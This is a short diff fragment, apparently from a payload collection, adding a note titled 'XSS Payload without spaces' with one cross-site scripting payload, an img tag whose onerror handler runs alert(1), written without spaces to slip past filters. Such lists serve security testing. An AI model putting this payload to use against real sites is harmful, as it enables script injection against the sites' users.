@@ -1,0 +1,3 @@
+XSS Payload without spaces
+
+1. <img/src/onerror=alert(1)>
